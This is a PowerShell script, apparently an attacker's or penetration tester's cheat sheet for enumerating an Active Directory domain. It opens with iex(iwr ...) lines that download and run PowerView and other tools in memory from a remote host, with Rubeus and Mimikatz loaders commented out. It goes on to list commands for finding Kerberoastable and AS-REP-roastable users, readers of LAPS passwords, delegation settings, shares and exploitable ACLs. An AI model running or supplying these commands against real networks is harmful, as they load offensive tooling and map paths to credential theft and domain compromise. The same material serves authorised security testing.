iex(iwr 192.168.0.91/ADEnum/Tools/PowerView.ps1 -usebasicparsing)
# iex(iwr 192.168.0.91/ADEnum/Tools/powermad.ps1 -usebasicparsing)
iex(iwr 192.168.0.91/ADEnum/Tools/ADModule/Import-ActiveDirectory.ps1 -usebasicparsing)
# iex(iwr 192.168.0.91/ADEnum/Tools/Invoke-Rubeus.ps1 -usebasicparsing)
# iex(iwr 192.168.0.91/ADEnum/Tools/Mimikatz.ps1 -usebasicparsing)

Import-ActiveDirectory

#enum current forest
Get-Domain

# get all domains
(Get-ADForest).Domains

# current domain trusts
Get-ADTrust -Filter * 

# top level domain trusts
Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get- ADForest).Name

# external trusts
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}

# pam trust or bastion forest
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}

# if current domain trusts another domain, we enumerate that too
# Get-ADTrust -Filter * -Server X

# enumerate users,computers,groups
Get-DomainUser|select Name
Get-DomainComputer|select Name|resolve-ipaddress
get-DomainGroup|select Name

# enumerate ous and gpos
Get-DomainGPO|select Name
Get-DomainOU|select Name

# enumerate kerberoastable users
Get-DomainUser –SPN

# perform kerberoast attack with rubeus

# asreproastable users
Get-DomainUser -PreauthNotRequired

# perform asreproast atack with rubeus

# see who can read laps
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}

# read laps
# Get-DomainObject -Identity us-mailmgmt | select - ExpandProperty ms-mcs-admpwd

# Unconstrained delegation
Get-DomainComputer -Unconstrained

# Constrained delegation
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth

# find shares
Find-DomainShare -CheckShareAccess

# check for sid history set users
Get-DomainUser -LDAPFilter '(sidHistory=*)'

# check for users if they do not require password
Get-DomainUser -UACFilter PASSWD_NOTREQD

# find interesting domain acls
Find-InterestingDomainAcl -ResolveGUIDs

